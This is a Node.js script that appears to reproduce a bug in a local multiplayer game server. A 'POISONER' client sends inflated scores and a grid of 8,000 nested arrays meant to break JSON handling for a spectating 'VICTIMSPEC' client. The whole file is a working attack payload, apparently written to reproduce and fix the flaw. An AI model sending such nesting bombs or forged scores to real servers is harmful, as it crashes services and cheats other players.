import { WebSocket } from 'ws';
import { appendFileSync } from 'fs';
const LOG = process.env.RLOG;
const log = (s) => appendFileSync(LOG, s + '\n');
const PORT = process.env.PORT || 4711;
const URL = `ws://127.0.0.1:${PORT}/ws`;
const DEPTH = 8000;
const poisonedGridJSON = '[' + '['.repeat(DEPTH) + '1' + ']'.repeat(DEPTH) + ']';

function mk(name) {
  const ws = new WebSocket(URL);
  ws.on('open', () => {
    log(`[${name}] open`);
    ws.send(JSON.stringify({ type: 'hello', role: 'battle', guestName: name }));
    ws.send(JSON.stringify({ type: 'queue', mode: 'royale' }));
  });
  ws.on('message', (raw) => {
    let m; try { m = JSON.parse(raw); } catch { return; }
    if (m.type === 'royale_found') { ws._in = true; log(`[${name}] royale_found`); }
    else if (m.type === 'royale_result') log(`[${name}] royale_result placement=${m.placement} spectate=${m.spectate}`);
    else if (m.type === 'royale_revive') log(`[${name}] revive score=${m.score}`);
    else if (m.type === 'error') log(`[${name}] error ${m.error}`);
  });
  ws.on('close', () => log(`[${name}] CLOSED`));
  ws.on('error', (e) => log(`[${name}] wserr ${e.message}`));
  return ws;
}
const A = mk('POISONER');
const B = mk('VICTIMSPEC');
let secs = 0, toppedOut = false;
const iv = setInterval(() => {
  secs++;
  if (A._in && A.readyState === 1) {
    const cap = Math.floor(secs * 500);   // ride the ceiling to stay leader
    try { A.send(`{"type":"state","score":${cap},"lines":8,"combo":3,"grid":${poisonedGridJSON}}`); } catch(e){ log('sendA fail '+e.message);}
  }
  if (B._in && !toppedOut) {
    toppedOut = true;
    log('[VICTIMSPEC] topping out to spectate');
    B.send(JSON.stringify({ type: 'royale_topout' }));
    setTimeout(() => { if (B.readyState===1) B.send(JSON.stringify({ type: 'royale_topout' })); }, 300);
  }
}, 1000);
setTimeout(() => { log('repro done'); clearInterval(iv); process.exit(0); }, 50000);
